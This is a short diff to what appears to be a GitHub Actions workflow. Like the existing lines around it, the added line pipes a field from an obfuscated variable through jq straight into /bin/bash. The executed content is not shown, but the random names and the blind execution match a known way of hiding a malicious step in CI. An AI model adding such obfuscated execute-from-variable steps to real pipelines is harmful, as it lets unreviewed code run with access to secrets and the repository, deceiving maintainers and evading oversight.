@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$wz2" | jq -r .bcaal47 | /bin/bash
           printf '%s' "$kzmg9057" | jq -r .zlsck1 | /bin/bash
           echo $x10 | jq -r .h1538 | /bin/bash
+          echo $gy31 | jq -r .u729 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
